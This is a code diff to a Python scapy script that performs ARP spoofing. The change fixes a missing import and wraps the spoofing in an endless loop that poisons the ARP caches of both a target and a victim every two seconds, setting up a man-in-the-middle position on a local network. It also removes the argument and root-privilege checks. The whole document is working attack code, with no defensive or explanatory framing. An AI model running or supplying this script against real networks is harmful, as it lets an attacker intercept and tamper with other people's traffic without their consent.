@@ -1,7 +1,6 @@
-from scapy.all import ARP, Ether, send, sniff
+from scapy.all import ARP, Ether, send, srp
 import time
 import sys
-import os
 
 # Function to get MAC address of a given IP
 def get_mac(ip):
@@ -14,7 +13,6 @@ def get_mac(ip):
     answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
     
     # Return the MAC address from the response
-    print(answered_list[0][1].hwsrc)
     return answered_list[0][1].hwsrc
 
 # ARP spoofing function
@@ -31,25 +29,17 @@ def spoof(target_ip, spoof_ip):
 # ARP spoofer main function
 def start_spoofing(target_ip, victim_ip):
     print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
-    # Spoof the target (make it think we are th, victim)
-    spoof(target_ip, victim_ip)
+    while True:
+        # Spoof the target (make it think we are the victim)
+        spoof(target_ip, victim_ip)
 
-    # Optionally, spoof th, victim (make it think we are the target)
-    spoof(victim_ip, target_ip)
-    
-    time.sleep(2)  # Wait 2 seconds before sending the next packet
+        # Spoof the victim (make it think we are the target)
+        spoof(victim_ip, target_ip)
+
+        time.sleep(2)  # Wait 2 seconds before sending the next packet
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print(f"Usage: {sys.argv[0]} <target_ip>, victim_ip>")
-        sys.exit(1)
-    
     target_ip = sys.argv[1]
     victim_ip = sys.argv[2]
-
-    # Check if the script is running with root privileges
-    if os.geteuid() != 0:
-        print("[!] Please run as root.")
-        sys.exit(1)
 
     start_spoofing(target_ip, victim_ip)
